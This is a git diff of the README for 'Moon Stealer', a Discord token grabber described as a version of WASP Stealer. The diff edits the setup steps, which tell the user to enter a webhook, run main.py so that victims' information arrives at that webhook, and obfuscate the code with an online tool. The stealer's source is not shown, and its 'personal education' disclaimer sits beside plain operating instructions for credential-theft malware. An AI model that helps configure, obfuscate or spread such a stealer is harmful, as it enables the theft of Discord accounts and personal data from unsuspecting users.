@@ -1,12 +1,13 @@
 <h1 align="center">
- 🌕 Moon Stealer (Discord Token Grabber) 🌕
+
+🌑 Moon Stealer (Discord Token Grabber) 🌑
+
 <h1 align="center">
  
-## WASP Stealer's **Custom** Version
+## WASP Stealer's **Moon** Version
 
  
-# Do not remove the image or it may not work.
-## You can remove the README.md file.
+# Do not remove the image or it will throws a error.
  
 <p align="center"> 
   <kbd>
@@ -16,15 +17,15 @@
   
 ## 〢 Content
 
-- [📁 Setting up](#setup)
-- [⚔️ Features](#features)
-- [⚠️ Note](#note)
+- [📁 Setup]
+- [⚔️ Features]
+- [ ⚠ Note]
 
-### 〢 Setting Up
+### 〢 Setup
 
-1. Put ur webhook at hook = ""
-2. and run main.py
-3. Obfuscation: https://github.com/billythegoat356/Hyperion
+1. Put ur webhook at ``hook = "X"``
+2. Run main.py, you will see your info in the webhook you entered.
+3. Obfuscation: https://pyobfuscate.com/
 
 <a id="features"></a>
 
@@ -60,3 +61,5 @@
 ### 〢 Note
 
 I am not responsible for any damages this software may cause. This was made for personal education.
+
+Credits: WASP Stealer
